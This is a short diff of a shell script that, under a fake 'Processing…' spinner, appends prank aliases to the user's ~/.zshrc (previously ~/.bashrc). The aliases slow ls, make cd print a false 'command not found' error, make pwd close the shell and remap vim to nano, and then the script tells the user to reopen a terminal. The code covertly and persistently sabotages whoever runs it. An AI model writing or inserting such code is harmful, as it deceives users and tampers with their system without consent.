@@ -17,16 +17,15 @@ spinner() {
   done
 }
 main_task() {
-    echo "alias ls='sleep 1; ls'" >>  ~/.bashrc
-    echo "alias cd='echo "cd: command not found, did you mean cd."'" >>  ~/.bashrc
-    echo "alias pwd='exit'" >>  ~/.bashrc
-    echo "alias vim='nano'" >> ~/.bashrc
-    source ~/.bashrc
-  sleep 4
+    echo "alias ls='sleep 1; ls'" >>  ~/.zshrc
+    echo "alias cd='echo "cd: command not found, did you mean cd."'" >>  ~/.zshrc
+    echo "alias pwd='exit'" >>  ~/.zshrc
+    echo "alias vim='nano'" >> ~/.zshrc
+    source ~/.zshrc
+    sleep 2;
 }
 main_task &
 task_pid=$!
 spinner "$task_pid" "Processing…"
-printf "\r${GREEN}✔ -----Success----- ✔${RESET}\n"
 sleep 1
 printf "\n\n\r${RED}You can now reopen a terminal${RESET}\n"
